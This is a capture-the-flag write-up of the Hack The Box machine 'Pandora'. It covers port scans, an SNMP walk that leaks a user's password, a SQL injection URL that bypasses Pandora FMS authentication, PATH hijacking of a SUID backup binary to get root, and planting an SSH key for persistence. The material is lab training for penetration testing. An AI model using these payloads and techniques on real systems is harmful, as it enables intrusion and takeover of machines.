# Pandora

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 -sV -p- pandora.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-20 22:36 EDT
Stats: 0:06:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.86% done; ETC: 22:44 (0:01:19 remaining)
Stats: 0:07:51 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.73% done; ETC: 22:45 (0:00:32 remaining)
Stats: 0:08:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.48% done; ETC: 22:45 (0:00:08 remaining)
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.13s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sU -p161 -sV -T4 pandora.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-20 22:45 EDT
Nmap scan report for pandora.htb (10.10.11.136)
Host is up (0.11s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: pandora
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nuclei -u <http://pandora.htb>

                     __     _
   ____  __  _______/ /__  (_)
  / __ \\/ / / / ___/ / _ \\/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\\__,_/\\___/_/\\___/_/   v3.4.10

                projectdiscovery.io

[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.3.0 (latest)
[INF] New templates added in latest release: 124
[INF] Templates loaded for current scan: 8616
[INF] Executing 7221 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1395 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1805 (Reduced 1692 Requests)
[INF] Using Interactsh Server: oast.me
[external-service-interaction] [http] [info] <http://pandora.htb>
[waf-detect:apachegeneric] [http] [info] <http://pandora.htb>
[ssh-server-enumeration] [javascript] [info] pandora.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3"]
[ssh-sha1-hmac-algo] [javascript] [info] pandora.htb:22
[CVE-2023-48795] [javascript] [medium] pandora.htb:22 ["Vulnerable to Terrapin"]
[ssh-password-auth] [javascript] [info] pandora.htb:22
[ssh-auth-methods] [javascript] [info] pandora.htb:22 ["["publickey","password"]"]
[openssh-detect] [tcp] [info] pandora.htb:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3"]
[snmpv1-community-detect-string] [javascript] [high] pandora.htb:161 ["pandora"] [community_string="public"]
[form-detection] [http] [info] <http://pandora.htb>
[options-method] [http] [info] <http://pandora.htb> ["GET,POST,OPTIONS,HEAD"]
[http-missing-security-headers:content-security-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:x-content-type-options] [http] [info] <http://pandora.htb>
[http-missing-security-headers:clear-site-data] [http] [info] <http://pandora.htb>
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:permissions-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:x-frame-options] [http] [info] <http://pandora.htb>
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] <http://pandora.htb>
[http-missing-security-headers:referrer-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] <http://pandora.htb>
[http-missing-security-headers:strict-transport-security] [http] [info] <http://pandora.htb>
[addeventlistener-detect] [http] [info] <http://pandora.htb>
[email-extractor] [http] [info] <http://pandora.htb> ["example@yourmail.com"]
[apache-detect] [http] [info] <http://pandora.htb> ["Apache/2.4.41 (Ubuntu)"]
[wordpress-detect] [http] [info] <http://pandora.htb>
[caa-fingerprint] [dns] [info] pandora.htb
[tech-detect:animate.css] [http] [info] <http://pandora.htb>
[tech-detect:bootstrap] [http] [info] <http://pandora.htb>
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ snmpwalk -v1 -c public pandora.htb  
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (76146) 0:12:41.46
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72

iso.3.6.1.2.1.25.4.2.1.5.880 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.894 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.937 = STRING: "-o -p -- \\\\u --noclear tty1 linux"
iso.3.6.1.2.1.25.4.2.1.5.960 = ""
iso.3.6.1.2.1.25.4.2.1.5.962 = STRING: "--no-debug"
iso.3.6.1.2.1.25.4.2.1.5.1101 = STRING: "-u daniel -p HotelBabylon23"
```

daniel:HotelBabylon23

```bash
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec  3  2021 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Dec  3  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 31 Dec  3  2021 /etc/apache2/sites-enabled/pandora.conf -> ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -L 1234:localhost:80 daniel@pandora.htb
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F3o3fmGZDhlQhDVVFzrSG%2Fimage.png?alt=media&#x26;token=22cf3169-90b9-4af4-a487-181790ec30e4" alt=""><figcaption></figcaption></figure>

The version is vulnerable to an unauthenticated SQL injection

Search for the fowllowing url and reload the login page to get authenticated

```bash
<http://localhost:1234/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271>
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F1B0n8KFRK3Yd1IndHPDE%2Fimage.png?alt=media&#x26;token=9ee6d939-0a05-465d-a431-844ab947a4ce" alt=""><figcaption></figcaption></figure>

Then reload the page and catch the shell

We find a SUID binary

```bash
find / -type f -perm -4000 -ls 2>/dev/null

262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
```

It runs the tar command, but the full path of the binary is not given, so we can abuse it and become root

```bash
matt@pandora:~$ cat tar
#!/bin/bash
bash

export PATH=/home/matt:$PATH
matt@pandora:~$ echo $PATH
/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

/usr/bin/pandora_backup
```

FOR IT TO WORK, WE NEED AN SSH SHELL ! IT DID NOT WORK EVEN IF I UPGRADED THE SHELL WITH PYTHON

```bash
# Create an ssh folder inside the user directory
mkdir .ssh

# Give it the right permissions
chmod 700 .ssh

# Create the authorized key file
touch authorized_key

# Copy our public key to the file
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLpmmj/zrHbqmJQNgYmeC/u51542F6qlVbeULoOKBOVPH3cdKaN4Qh9oMfVBeL43WLXCHImTF0sjqSifgBg+4V1VNlGBpVVa51uuv64Y49IdC1ASR/P0E/mm+pEs2jpUyqxduQBMSzMasnLQnoGSYAo/gdCfTL/lPFLOJachq107hMCKe7o6eFLt8+NJiyrgZu3xvGTgYcoNebvT+tFdtNB/o5oxfLzb0ihK4rfdYJJBdgOIVF/luEQ0jubGi6jZA+u907/TQ2f0hu3arxytd6hUQ9oIbnHqu4or3hRhCVWZYCrfOhyBI5Ute96eYLNnNLdaL8I2pVqbmLotNsYYv3hVlnPlM0VtZs1fC9BeswHpGFfY7AZLvAUJSss3DgSIyAf2Us/kq/dPqXBTthdsupOBaA4fwuBgSI0OAov4rkgOYCqH+h6zb/y3E9s+fUQfwEPtXHCjgj7IKIoaseqBt8mZRxpVDw/yT3VanwRThd4G0pgZKedltoP8E6L1Vcq+s= kali@kali' >> /home/matt/.ssh/authorized_keys

# Then we can ssh and get a stable shell
ssh matt@pandora.htb
```
